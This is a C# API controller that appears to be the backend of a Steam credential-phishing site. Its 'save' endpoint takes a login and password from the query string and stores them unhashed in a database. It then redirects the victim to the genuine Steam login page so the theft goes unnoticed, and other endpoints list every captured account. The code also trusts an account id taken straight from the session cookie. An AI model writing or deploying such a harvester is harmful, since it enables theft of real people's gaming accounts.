using System.Text.RegularExpressions;
using HTTPServer.Models;
using HTTPServer.Services;
using HTTPServer.Services.ServerServices;

namespace HTTPServer.Controllers
{
    [ApiController("api")]
    public class ApiController
    {
        [HttpGet("getAccountInfo")]
        [Authorize]
        [SessionCookieRequired]
        public async Task<IActionResult> GetAccountInfoAsync(string sessionCookie)
        {
            var id = int.Parse(sessionCookie.Split()[1].Replace("Id=", ""));
            var account = DBProvider.GetSteamAccount(id);
            
            if(account != null)
                return ActionResultFactory.Json(account);
            
            return ActionResultFactory.Json(new SteamAccount[0]);
        } 



        [HttpGet("accounts")]
        [Authorize]
        public async Task<IActionResult> GetAccountsAsync([FromQuery] int id)
        {
            var account = DBProvider.GetSteamAccount(id);
            if (account != null)
                return ActionResultFactory.Json(account);
            
            return ActionResultFactory.Json(new SteamAccount[0]);
        }

        [HttpGet("accounts")]
        [Authorize]
        public async Task<IActionResult> GetAccountsAsync()
        {
            var list = DBProvider.GetSteamAccounts();
            return ActionResultFactory.Json(list);
        }

        [HttpPost("save")]
        public async Task<IActionResult> SaveAccountAsync([FromQuery] string login, [FromQuery] string password)
        {
            if(AreCorrect(login, password))
            {
                var executedRows = await DBProvider.WriteToDatabaseAsync(
                    new SteamAccount(){Login = login, Password = password});
                if (executedRows > 0)
                    return ActionResultFactory.RedirectTo("https://store.steampowered.com/login");
            }
            
            return ActionResultFactory.RedirectTo("/");
        }

        private static bool AreCorrect(string login, string password)
        {
            if (string.IsNullOrEmpty(login) || string.IsNullOrEmpty(password))
                return false;
            
            return Regex.IsMatch(login, @"\b(\w+?[a-zA-Z0-9]_?)\b")
                   && Regex.IsMatch(password, @"\b(\w+?[a-zA-Z0-9]\№?\%?\??\*?\(?\)?\@?\#?\$?\^?\&?_?)\b");
        }
    }
}